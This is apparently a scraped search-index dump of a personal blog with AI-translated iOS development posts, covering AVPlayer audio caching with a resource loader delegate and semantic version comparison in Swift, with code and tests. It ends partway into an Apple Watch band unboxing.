this method will be called repeatedly, receiving data in fragments; we append these fragments into downloadedData for storage.func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?)When a task is canceled or ended, this method is called to save the downloaded data.As mentioned in the introductory knowledge about the Cancel mechanism, the player will initiate a Cancel Request once it has received enough data. Therefore, when entering this method, the actual error will be error = NSURLErrorCancelled. Thus, regardless of the error, if we have received data, we will try to save it. ‚ö†Ô∏è Since URLSession sends requests concurrently, please keep all operations within a DispatchQueue to avoid data corruption (data corruption can cause severe playback glitches). Ô∏èÔ∏è‚ö†Ô∏èURLSession will strongly retain objects causing memory leaks if neither finishTasksAndInvalidate nor invalidateAndCancel is called; therefore, whether canceling or completing, we must call one of these to release the request when the task ends. Ô∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èIf you are worried about downloadedData causing OOM, you can save it locally within didReceive Data.ResourceLoaderimport AVFoundationimport Foundationclass ResourceLoader: NSObject { let loaderQueue = DispatchQueue(label: \"li.zhgchg.resourceLoader.queue\") private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] private let cacheKey: String private let originalURL: URL init(asset: CachingAVURLAsset) { self.cacheKey = asset.cacheKey self.originalURL = asset.originalURL super.init() } deinit { self.requests.forEach { (request) in request.value.cancel() } }}extension ResourceLoader: AVAssetResourceLoaderDelegate { func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool { let type = ResourceLoader.resourceLoaderRequestType(loadingRequest) let assetDataManager = PINCacheAssetDataManager(cacheKey: self.cacheKey) if let assetData = assetDataManager.retrieveAssetData() { if type == .contentInformation { loadingRequest.contentInformationRequest?.contentLength = assetData.contentInformation.contentLength loadingRequest.contentInformationRequest?.contentType = assetData.contentInformation.contentType loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = assetData.contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() return true } else { let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) if assetData.mediaData.count &gt; 0 { let end: Int64 switch range.end { case .requestTo(let rangeEnd): end = rangeEnd case .requestToEnd: end = assetData.contentInformation.contentLength } if assetData.mediaData.count &gt;= end { let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;Int(end)) loadingRequest.dataRequest?.respond(with: subData) loadingRequest.finishLoading() return true } else if range.start &lt;= assetData.mediaData.count { // has cache data...but not enough let subEnd = (assetData.mediaData.count &gt; end) ? Int((end)) : (assetData.mediaData.count) let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;subEnd) loadingRequest.dataRequest?.respond(with: subData) } } } } let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) let resourceLoaderRequest = ResourceLoaderRequest(originalURL: self.originalURL, type: type, loaderQueue: self.loaderQueue, assetDataManager: assetDataManager) resourceLoaderRequest.delegate = self self.requests[loadingRequest]?.cancel() self.requests[loadingRequest] = resourceLoaderRequest resourceLoaderRequest.start(requestRange: range) return true } func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest) { guard let resourceLoaderRequest = self.requests[loadingRequest] else { return } resourceLoaderRequest.cancel() requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader: ResourceLoaderRequestDelegate { func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } switch result { case .success(let contentInformation): loadingRequest.contentInformationRequest?.contentType = contentInformation.contentType loadingRequest.contentInformationRequest?.contentLength = contentInformation.contentLength loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() case .failure(let error): loadingRequest.finishLoading(with: error) } } func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.dataRequest?.respond(with: data) } func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.finishLoading(with: error) requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader { static func resourceLoaderRequestType(_ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestType { if let _ = loadingRequest.contentInformationRequest { return .contentInformation } else { return .dataRequest } } static func resourceLoaderRequestRange(_ type: ResourceLoaderRequest.RequestType, _ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestRange { if type == .contentInformation { return ResourceLoaderRequest.RequestRange(start: 0, end: .requestTo(1)) } else { if loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestToEnd) } else { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 let length = Int64(loadingRequest.dataRequest?.requestedLength ?? 1) let upperBound = lowerBound + length return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestTo(upperBound)) } } }}loadingRequest.contentInformationRequest != nil means it is the first request, and the player is asking for the file information first.When requesting file information, we need to provide these three pieces of information: loadingRequest.contentInformationRequest?.isByteRangeAccessSupported : Whether range data access is supported loadingRequest.contentInformationRequest?.contentType : Uniform Type Identifier loadingRequest.contentInformationRequest?.contentLength : Total file length Int64 loadingRequest.dataRequest?.requestedOffset can get the starting offset of the requested Range.loadingRequest.dataRequest?.requestedLength can get the length of the requested Range.If loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true, then ignore the requested Range length and fetch to the end directly.loadingRequest.dataRequest?.respond(with: Data) returns the loaded Data to the player.loadingRequest.dataRequest?.currentOffset can get the current data offset. After dataRequest?.respond(with: Data), the currentOffset will advance accordingly.loadingRequest.finishLoading() all data has been loaded, notify the player.func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; BoolThe player requests data, and we first check if the local cache has the data. If it does, we return it; if only part of the data is available, we return that part. For example, if the local cache has 0‚Äì100 and the player requests 0‚Äì200, we return 0‚Äì100 first.If there is no local cache or the returned data is insufficient, a ResourceLoaderRequest will be initiated to fetch data from the network.func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest)Player canceled the request, canceling ResourceLoaderRequest. You may have noticed resourceLoaderRequestRange offset is based on currentOffset, because we first respond with locally downloaded data using dataRequest?.respond(with: Data); therefore, we directly use the adjusted offset.func private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] ‚ö†Ô∏è Some examples use only currentRequest: ResourceLoaderRequest to store requests. This causes an issue because if the current request is being processed and the user seeks again, the old request will be canceled and a new one started. However, since these actions may not happen in order‚Äîsometimes starting a new request before canceling the old one‚Äîusing a Dictionary to manage requests is safer! ‚ö†Ô∏èEnsure all operations run on the same DispatchQueue to prevent data glitches.Cancel all ongoing requests during deinitResource Loader Deinit means AVURLAsset Deinit, indicating the player no longer needs this resource; therefore, we can cancel any ongoing data requests. Data already loaded will still be written to the cache.Supplement and AcknowledgmentsThanks to Lex Ê±§ for the great guidance.Thanks to granddaughter for providing development advice and support.This article only focuses on small music filesLarge video files may cause Out Of Memory issues in downloadedData and AssetData/PINCacheAssetDataManager.As mentioned earlier, to solve this issue, use fileHandler seek read/write to operate local Cache for reading and writing (replacing AssetData/PINCacheAssetDataManager); or check Github for any projects that handle big data write/read to file.Cancel Downloading Items When AVQueuePlayer Switches Playback ItemsAs mentioned in the previous knowledge, switching the playback target does not trigger a Cancel; for AVPlayer, it goes through AVURLAsset Deinit, so the download is also interrupted; however, AVQueuePlayer does not, because the items remain in the queue, and only the playback target moves to the next item.The only approach here is to listen for playback target change notifications, then cancel the previous AVURLAsset loading upon receiving the notification.asset.cancelLoading()Audio Data Encryption and DecryptionAudio encryption and decryption can be performed on the Data obtained from ResourceLoaderRequest, and during storage, encryption and decryption can be applied to the locally stored Data in AssetData‚Äôs encode/decode methods.CryptoKit SHA Usage Example:class AssetData: NSObject, NSCoding { static let encryptionKeyString = \"encryptionKeyExzhgchgli\" ... func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) if #available(iOS 13.0, *), let encryptionData = try? ChaChaPoly.seal(self.mediaData, using: AssetData.encryptionKey).combined { coder.encode(encryptionData, forKey: #keyPath(AssetData.mediaData)) } else { // } } required init?(coder: NSCoder) { super.init() ... if let mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data { if #available(iOS 13.0, *), let sealedBox = try? ChaChaPoly.SealedBox(combined: mediaData), let decryptedData = try? ChaChaPoly.open(sealedBox, using: AssetData.encryptionKey) { self.mediaData = decryptedData } else { // } } else { // } }}PINCache Related OperationsPINCache includes PINMemoryCache and PINDiskCache. PINCache handles reading from files to memory and writing from memory to files. We only need to operate on PINCache.Find Cache File Location in the Simulator:Using NSHomeDirectory() to Get Simulator File PathFinder -&gt; Go -&gt; Paste PathIn Library -&gt; Caches -&gt; com.pinterest.PINDiskCache.ResourceLoader is the Resource Loader Cache directory we created.PINCache(name: \"ResourceLoader\") The name here refers to the directory name.You can also specify rootPath, so the directory can be changed to under Documents (not worried about being cleared by the system).Set the maximum limit for PINCache: PINCacheAssetDataManager.Cache.diskCache.byteCount = 300 * 1024 * 1024 // max: 300mb PINCacheAssetDataManager.Cache.diskCache.byteLimit = 90 * 60 * 60 * 24 // 90 daysSystem Default LimitSetting it to 0 will prevent the file from being deleted automatically.PostscriptI initially underestimated the difficulty of this feature, thinking it would be done in no time; however, I struggled a lot and spent about two more weeks dealing with data storage issues. On the bright side, I thoroughly understood the entire Resource Loader mechanism, GCD, and Data.ReferencesFinally, here are the reference materials on how to implement the research. iOS AVPlayer Video Cache Design and Implementation Principles Only Implement audio and video playback and caching based on AVPlayer, supporting synchronized video output [ SZAVPlayer ] includes code (very complete but complex) CachingPlayerItem (simple implementation, easier to understand but incomplete) Possibly the Best AVPlayer Audio and Video Caching Solution AVAssetResourceLoaderDelegate Douyin (TikTok) Swift Version [ Github ] (An interesting project that replicates the Douyin app; it also uses Resource Loader) iOS HLS Cache Implementation Exploration Journey Extension DLCachePlayer (Objective-C version)If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "AVPlayer Streaming with CacheÔΩúImplement AVAssetResourceLoaderDelegate for Smooth Playback", "url": "/posts/avplayer-streaming-with-cache-implement-avassetresourceloaderdelegate-for-smooth-playback-ee47f8f1e2d2/", "categories": "", "tags": "english, ai-translation, ios, ios-app-development, cache, avplayer, music-player", "date": "2021-01-05 22:27:52 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Old] AVPlayer Streaming with Caching in PracticeUnderstanding the Context of ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Old] AVPlayer Streaming with Caching in PracticeUnderstanding the Context of Implementing AVAssetResourceLoaderDelegate with AVPlayer/AVQueuePlayer Using AVURLAsset[2021‚Äì01‚Äì31] Article Announcement: Article Editing CompletedFirst, I would like to deeply apologize to all readers who have already read the original article, as my rashness in publishing it without thorough research caused some errors and wasted your valuable time.The entire context has been reviewed from the beginning, and a new article has been written; it includes the complete project code for everyone‚Äôs reference. Thank you!Change content: About 30%New Content: About 60% Complete Guide to Implementing Local Cache with AVPlayer Click to View üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS App Versioning ExplainedÔΩúKey Rules and Comparison Solutions", "url": "/posts/zrealm-dev/ios-app-versioning-explained-key-rules-and-comparison-solutions-c4d7c2ce5a8d/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, software-engineering, version-control, software-development", "date": "2020-12-17 22:33:08 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!About iOS App Version NumbersVersion Number Rules and Comparison SolutionsPhot...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!About iOS App Version NumbersVersion Number Rules and Comparison SolutionsPhoto by James YaremaPrefaceEvery iOS app developer encounters two numbers: Version Number and Build Number. Recently, I faced a requirement related to version numbers to prompt users for app reviews. Along the way, I explored some facts about version numbers. At the end of the article, I will also share my complete solution for version number checks.XCode HelpSemantic Version x.y.zFirst, let‚Äôs introduce the ‚ÄúSemantic Versioning‚Äù specification. It mainly addresses issues related to software dependencies and management, such as those we often encounter with Cocoapods. For example, if I use Moya 4.0, which depends on Alamofire 2.0.0, and Alamofire gets updated‚Äîwhether adding new features, fixing bugs, or completely redesigning the architecture (breaking backward compatibility)‚Äîwithout a common versioning standard, it would become chaotic. You wouldn‚Äôt know which versions are compatible or safe to update.The semantic version consists of three parts: x.y.z x: Major version: When you make incompatible API changes y: Minor version: When you add backward-compatible functional improvements z: Patch number: When you make backward-compatible bug fixes General Rules: Must be a non-negative integer No leading zeros allowed 0.y.z versions indicate the initial development stage and should not be used for official releases. In ascending numerical order Comparison Method: First compare the major version number; if the major versions are equal, then compare the minor version number; if the minor versions are also equal, then compare the revision number. ex: 1.0.0 &lt; 2.0.0 &lt; 2.1.0 &lt; 2.1.1You can also add a ‚Äúpre-release version number (e.g., 1.0.1-alpha)‚Äù or ‚Äúbuild metadata (e.g., 1.0.0-alpha+001)‚Äù after the patch number. However, iOS app version numbers do not allow these two formats to be uploaded to the App Store, so this will not be discussed further here. For more details, please refer to Semantic Versioning.‚úÖÔºö1.0.1, 1.0.0, 5.6.7‚ùåÔºö01.5.6, a1.2.3, 2.005.6Practical UseRegarding the actual use of version control in iOS apps, since we only mark the release app version and there are no dependencies with other apps or software, the definition in practice is determined by each team. The following is just a personal opinion: x: Major version number: Used for significant updates (multiple page interface redesigns, launch of key features) y: Minor version number: For optimizing and enhancing existing features (adding small features under major functions) z: Patch version: Used when fixing bugs in the current version Generally, the revision number is only changed for emergency fixes (Hot Fix); under normal circumstances, it remains 0. When a new version is released, it can be reset to 0. EX: First release (1.0.0) -&gt; Enhance features of the first version (1.1.0) -&gt; Found issues to fix (1.1.1) -&gt; Found more issues (1.1.2) -&gt; Continue enhancing first version features (1.2.0) -&gt; Major update (2.0.0) -&gt; Found issues to fix (2.0.1) ‚Ä¶ and so onVersion Number vs. Build NumberVersion Number (APP version number) For App Store and external identification use Property List Key: CFBundleShortVersionString Content can only consist of numbers and ‚Äú.‚Äù The official recommendation is to use the semantic versioning format x.y.z. 2020121701, 2.0, 2.0.0.1 are all acceptable(The summary below shows the naming conventions of app version numbers on the App Store) No more than 18 characters If the format is incorrect, you can build &amp; run but cannot package and upload to the App Store. Can only increase upwards, no duplicates, no decreases It is common to use semantic versions x.y.z or x.y.Build Number Internal development process and phase identification are for internal use only and will not be disclosed to users. Packaging and uploading to the App Store for identification use (the same build number cannot be uploaded repeatedly) Property List Key: CFBundleVersion Content can only consist of numbers and ‚Äú.‚Äù The official recommendation is to use the semantic versioning format x.y.z. 2020121701, 2.0, and 2.0.0.1 are all acceptable No more than 18 characters Build &amp; run works, but cannot package and upload to the App Store The same app version number cannot be duplicated, but different app version numbers can have the same build number.ex: 1.0.0 build: 1.0.0, 1.1.0 build: 1.0.0 ‚úÖ It is common to use the date and number (each new version starts from 0), combined with CI/fastlane to automatically increment the build number during packaging.I briefly analyzed the version number formats of the apps on the leaderboard, as shown in the above image.Generally, x.y.z is used as the main format.Version Number Comparison and Determination MethodSometimes we need to use version checks, for example: force an update if the version is below x.y.z, or prompt for a review at a specific version. In these cases, we need the ability to compare two version strings.Simple Methodlet version = \"1.0.0\"print(version.compare(\"1.0.0\", options: .numeric) == .orderedSame) // true 1.0.0 = 1.0.0print(version.compare(\"1.22.0\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 1.22.0print(version.compare(\"0.0.9\", options: .numeric) == .orderedDescending) // true 1.0.0 &gt; 0.0.9print(version.compare(\"2\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 2You can also write a String Extension:extension String { func versionCompare(_ otherVersion: String) -&gt; ComparisonResult { return self.compare(otherVersion, options: .numeric) }}‚ö†Ô∏èHowever, be aware that judging similarity based on different formats may cause errors:let version = \"1.0.0\"version.compare(\"1\", options: .numeric) //.orderedDescendingIn fact, we know that 1 == 1.0.0, but using this method will result in .orderedDescending; you can refer to this article for padding zeros before comparison. Normally, once we choose an app version format, it should not change‚Äîif you use x.y.z, keep using x.y.z consistently, and avoid switching between x.y.z and x.y.Complex MethodYou can directly use the existing wheel: mrackwitz/Version The following is a rebuilt wheel.For complex methods, the semantic versioning format x.y.z is followed. Regex is used to parse strings, and comparison operators are implemented manually. Besides the basic =/&gt;/‚â•/&lt;/‚â§ operators, the ~&gt; operator (same as Cocoapods version specification) is also supported, along with static input.~&gt; operator is defined as:Greater than or equal to this version but less than (previous major version + 1)EX:~&gt; 1.2.1: (1.2.1 &lt;= version &lt; 1.3) 1.2.3,1.2.4...~&gt; 1.2: (1.2 &lt;= version &lt; 2) 1.3,1.4,1.5,1.3.2,1.4.1...~&gt; 1: (1 &lt;= version &lt; 2) 1.1.2,1.2.3,1.5.9,1.9.0... First, we need to define the Version object:@objcMembersclass Version: NSObject { private(set) var major: Int private(set) var minor: Int private(set) var patch: Int override var description: String { return \"\\(self.major),\\(self.minor),\\(self.patch)\" } init(_ major: Int, _ minor: Int, _ patch: Int) { self.major = major self.minor = minor self.patch = patch } init(_ string: String) throws { let result = try Version.parse(string: string) self.major = result.version.major self.minor = result.version.minor self.patch = result.version.patch } static func parse(string: String) throws -&gt; VersionParseResult { let regex = \"^(?:(&gt;=\\|&gt;\\|&lt;=\\|&lt;\\|~&gt;\\|=\\|!=){1}\\\\s*)?(0\\|[1-9]\\\\d*)\\\\.(0\\|[1-9]\\\\d*)\\\\.(0\\|[1-9]\\\\d*)$\" let result = string.groupInMatches(regex) if result.count == 4 { // start with operator... let versionOperator = VersionOperator(string: result[0]) guard versionOperator != .unSupported else { throw VersionUnSupported() } let major = Int(result[1]) ?? 0 let minor = Int(result[2]) ?? 0 let patch = Int(result[3]) ?? 0 return VersionParseResult(versionOperator, Version(major, minor, patch)) } else if result.count == 3 { // unspecified operator... let major = Int(result[0]) ?? 0 let minor = Int(result[1]) ?? 0 let patch = Int(result[2]) ?? 0 return VersionParseResult(.unSpecified, Version(major, minor, patch)) } else { throw VersionUnSupported() } }}// Supported Objects@objc class VersionUnSupported: NSObject, Error { }@objc enum VersionOperator: Int { case equal case notEqual case higherThan case lowerThan case lowerThanOrEqual case higherThanOrEqual case optimistic case unSpecified case unSupported init(string: String) { switch string { case \"&gt;\": self = .higherThan case \"&lt;\": self = .lowerThan case \"&lt;=\": self = .lowerThanOrEqual case \"&gt;=\": self = .higherThanOrEqual case \"~&gt;\": self = .optimistic case \"=\": self = .equal case \"!=\": self = .notEqual default: self = .unSupported } }}@objcMembersclass VersionParseResult: NSObject { var versionOperator: VersionOperator var version: Version init(_ versionOperator: VersionOperator, _ version: Version) { self.versionOperator = versionOperator self.version = version }}You can see that Version is a storage for major, minor, and patch. The parsing method is written as static for easy external use. It can accept formats like 1.0.0 or ‚â•1.0.1, which makes string parsing and config file parsing convenient.Input: 1.0.0 =&gt; Output: .unSpecified, Version(1.0.0)Input: ‚â• 1.0.1 =&gt; Output: .higherThanOrEqual, Version(1.0.0)Regex is modified based on the Regex reference provided in the Semantic Versioning document.^(0\\|[1-9]\\d*)\\.(0\\|[1-9]\\d*)\\.(0\\|[1-9]\\d*)(?:-((?:0\\|[1-9]\\d*\\|\\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\\.(?:0\\|[1-9]\\d*\\|\\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\\+([0-9a-zA-Z-]+(?:\\.[0-9a-zA-Z-]+)*))?$ Considering the project involves mixed Objective-C, OC must also be usable, so all are declared as @objcMembers, and compatible OC syntax is used as a compromise. (Actually, you can directly use VersionOperator with enum: String, and Result with tuple/struct) *If your implementation inherits from NSObject and implements Comparable/Equatable‚Äôs ==, remember to also implement !=, as the original NSObject‚Äôs != operation will not behave as expected.2. Implement Comparable Method:extension Version: Comparable { static func &lt; (lhs: Version, rhs: Version) -&gt; Bool { if lhs.major &lt; rhs.major { return true } else if lhs.major == rhs.major { if lhs.minor &lt; rhs.minor { return true } else if lhs.minor == rhs.minor { if lhs.patch &lt; rhs.patch { return true } } } return false } static func == (lhs: Version, rhs: Version) -&gt; Bool { return lhs.major == rhs.major &amp;&amp; lhs.minor == rhs.minor &amp;&amp; lhs.patch == rhs.patch } static func != (lhs: Version, rhs: Version) -&gt; Bool { return !(lhs == rhs) } static func ~&gt; (lhs: Version, rhs: Version) -&gt; Bool { let start = Version(lhs.major, lhs.minor, lhs.patch) let end = Version(lhs.major, lhs.minor, lhs.patch) if end.patch &gt;= 0 { end.minor += 1 end.patch = 0 } else if end.minor &gt; 0 { end.major += 1 end.minor = 0 } else { end.major += 1 } return start &lt;= rhs &amp;&amp; rhs &lt; end } func compareWith(_ version: Version, operator: VersionOperator) -&gt; Bool { switch `operator` { case .equal, .unSpecified: return self == version case .notEqual: return self != version case .higherThan: return self &gt; version case .lowerThan: return self &lt; version case .lowerThanOrEqual: return self &lt;= version case .higherThanOrEqual: return self &gt;= version case .optimistic: return self ~&gt; version case .unSupported: return false } }}It actually implements the judgment logic described earlier, and finally opens a compareWith method interface for external use to directly input the parsed results and get the final judgment.Usage Example:let shouldAskUserFeedbackVersion = \"&gt;= 2.0.0\"let currentVersion = \"3.0.0\"do { let result = try Version.parse(shouldAskUserFeedbackVersion) result.version.comparWith(currentVersion, result.operator) // true} catch { print(\"version string parse error!\")}Or‚Ä¶Version(1,0,0) &gt;= Version(0,0,9) //true... Supports the operators &gt;/‚â•/&lt;/‚â§/=/!=/~&gt;.Next StepsTest cases‚Ä¶import XCTestclass VersionTests: XCTestCase { func testHigher() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &gt; Version(2, 100, 120), true) XCTAssertEqual(version &gt; Version(3, 12, 0), true) XCTAssertEqual(version &gt; Version(3, 10, 0), true) XCTAssertEqual(version &gt;= Version(3, 12, 1), true) XCTAssertEqual(version &gt; Version(3, 12, 1), false) XCTAssertEqual(version &gt; Version(3, 12, 2), false) XCTAssertEqual(version &gt; Version(4, 0, 0), false) XCTAssertEqual(version &gt; Version(3, 13, 1), false) } func testLower() throws { let version = Version(3, 12, 1) XCTAssertEqual(version &lt; Version(2, 100, 120), false) XCTAssertEqual(version &lt; Version(3, 12, 0), false) XCTAssertEqual(version &lt; Version(3, 10, 0), false) XCTAssertEqual(version &lt;= Version(3, 12, 1), true) XCTAssertEqual(version &lt; Version(3, 12, 1), false) XCTAssertEqual(version &lt; Version(3, 12, 2), true) XCTAssertEqual(version &lt; Version(4, 0, 0), true) XCTAssertEqual(version &lt; Version(3, 13, 1), true) } func testEqual() throws { let version = Version(3, 12, 1) XCTAssertEqual(version == Version(3, 12, 1), true) XCTAssertEqual(version == Version(3, 12, 21), false) XCTAssertEqual(version != Version(3, 12, 1), false) XCTAssertEqual(version != Version(3, 12, 2), true) } func testOptimistic() throws { let version = Version(3, 12, 1) XCTAssertEqual(version ~&gt; Version(3, 12, 1), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 12, 9), true) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 13, 1), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(2, 13, 0), false) //3.12.1 &lt;= $0 &lt; 3.13.0 XCTAssertEqual(version ~&gt; Version(3, 11, 100), false) //3.12.1 &lt;= $0 &lt; 3.13.0 } func testVersionParse() throws { let unSpecifiedVersion = try? Version.parse(string: \"1.2.3\") XCTAssertNotNil(unSpecifiedVersion) XCTAssertEqual(unSpecifiedVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(unSpecifiedVersion!.versionOperator, .unSpecified) let optimisticVersion = try? Version.parse(string: \"~&gt; 1.2.3\") XCTAssertNotNil(optimisticVersion) XCTAssertEqual(optimisticVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(optimisticVersion!.versionOperator, .optimistic) let higherThanVersion = try? Version.parse(string: \"&gt; 1.2.3\") XCTAssertNotNil(higherThanVersion) XCTAssertEqual(higherThanVersion!.version == Version(1, 2, 3), true) XCTAssertEqual(higherThanVersion!.versionOperator, .higherThan) XCTAssertThrowsError(try Version.parse(string: \"!! 1.2.3\")) { error in XCTAssertEqual(error is VersionUnSupported, true) } }}Currently planning to further optimize the version, adjust performance testing, organize and package, then run the process to create my own CocoaPods.However, there is already a complete Version for handling Pod projects, so there is no need to reinvent the wheel. I just wanted to streamline the build process XD.Maybe I will also submit a PR implementing ~&gt; for an existing library.References: Xcode Help Semantic Versioning 2.0.0 How to compare two app version strings in Swift mrackwitz/Version If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple Watch Stainless Steel Milanese Loop UnboxingÔΩúPremium 44mm Graphite Band Review", "url": "/posts/zrealm-life/apple-watch-stainless-steel-milanese-loop-unboxing-premium-44mm-graphite-band-review-c0f99f987d9c/", "categories": "ZRealm Life.", "tags": "english, ai-translation, apple-watch, lifestyle, unboxing, apple, milanese-loop", "date": "2020-11-02 23:23:46 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Official Stainless Steel Milanese Loop UnboxingApple Official Stai...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Official Stainless Steel Milanese Loop UnboxingApple Official Stainless Steel 44mm Graphite Milanese Loop UnboxingFollowing the previous article ‚ÄúApple Watch Series 6 Unboxing &amp; Two-Year Review,‚Äù I finally decided to buy the official Milanese Loop band. I had wanted it for two years but never pulled the trigger. This time, I upgraded everything at once. Since Apple guarantees the band is compatible with all future Apple Watch versions, I‚Äôm not worried about the band becoming unusable after future watch upgrades.2025/08 Update:Currently, my Milanese watch strap has been used for nearly 5 years without significant wear, rust, stretching, or odor. Compared to other straps I‚Äôve owned, this one is the longest-lasting and most durable.Further Reading 2025 Busan 8-Day Free Travel Guide: Attractions, Food, Transportation, and Money-Saving Tips 2024 San‚Äôin Kansai 7-Day Free Travel GuideÔΩúIn-depth Travel Notes on Shimane, Tottori, Himeji, Osaka, and Kobe 2024 Kyushu Free Travel Guide: Busan Cruise Entry, Must-Visit Spots in Kyushu, and Practical Itinerary Tips 2023 Sanyo Hiroshima Okayama 6-Day Independent Travel Guide: Attractions, Food, and Transportation Complete Guide 2023 Kyushu 10-Day Independent Travel Guide: In-Depth Travelogue and Practical Tips for Fukuoka, Nagasaki, and Kumamoto One-Day Flash Trip Guide to Nagoya: Taking Peach Aviation and Recommended Attractions AdvantagesThe Milanese loop is made of stainless steel mesh and a magnetic clasp. The stainless steel mesh offers breathability, quick drying, and no odor. The magnetic clasp allows the strap to be adjusted to any position, fits the wrist better, is easy to wear, and has a strong magnet that prevents it from falling off. Most importantly, it makes the Apple 